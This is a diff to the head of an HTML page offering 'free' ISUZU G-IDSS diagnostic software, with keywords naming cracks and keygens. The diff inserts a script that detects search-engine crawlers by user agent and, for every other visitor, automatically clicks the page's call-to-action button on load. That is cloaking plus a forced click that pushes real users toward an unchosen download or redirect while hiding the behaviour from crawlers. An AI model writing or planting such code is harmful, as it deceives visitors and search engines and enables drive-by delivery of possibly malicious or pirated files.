@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ISUZU G-IDSS Global Export 07.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download ISUZU G-IDSS Global Export 07.2024 diagnostic software for service information, diagnostics, and more. Free downloads available.">
     <meta name="keywords" content="ISUZU G-IDSS, ISUZU G-IDSS Global Export, ISUZU G-IDSS 07.2024, ISUZU G-IDSS diagnostic software, ISUZU G-IDSS diagnostic software free download, ISUZU G-IDSS software download, ISUZU G-IDSS software free download, ISUZU G-IDSS software crack, ISUZU G-IDSS software keygen, Isuzu service information, Isuzu mechanical troubleshooting, Isuzu DTC diagnostics, Isuzu ETM wiring diagram, Isuzu diagnostic functions, Isuzu controller programming, Isuzu saved data, Isuzu utility functions, Isuzu automatic vehicle recognition, Isuzu read and clear DTC, Isuzu data list, Isuzu actuation test, Isuzu reset maintenance, Isuzu troubleshooting and repair manual, Isuzu repair documentation, Isuzu steering sensor calibration, Isuzu injector registration, Isuzu pump learning, Isuzu reset ECM, Isuzu programming key, Isuzu write VIN, ISUZU G-IDSS Global Export multi-language, ISUZU G-IDSS Global Export English database, ISUZU G-IDSS Global Export download, ISUZU G-IDSS Global Export free download, ISUZU G-IDSS 07.2024 free download, Isuzu diagnostic software Russian, Isuzu diagnostic software Ukrainian, ISUZU G-IDSS бесплатная загрузка, ISUZU G-IDSS завантажити безкоштовно">
     <style>
